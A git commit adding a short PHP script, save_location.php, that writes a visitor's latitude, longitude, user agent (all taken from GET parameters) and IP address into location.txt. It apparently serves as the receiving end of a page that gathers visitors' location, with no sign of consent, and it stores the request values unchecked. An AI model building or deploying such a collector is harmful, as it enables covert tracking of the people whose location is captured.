0039f3a93c9b10cd11189705a8babc9638ff9867
medo-atif <156851154+medo-atif@users.noreply.github.com>
2024-01-16 22:50:31 +0200

    Add files via upload

---
+++ save_location.php
@@ -0,0 +1,18 @@
+<?php 
+
+$my_file = fopen("location.txt", "w");
+$information = "lat:" . $_GET["lat"] . "\nlong:" . $_GET["long"] . "\nip: " . $_SERVER["REMOTE_ADDR"] . "\nuser_agent: " . $_GET["user_agent"];
+fwrite($my_file, $information);
+fclose($my_file);
+
+
+
+
+
+
+
+
+
+
+
+?>
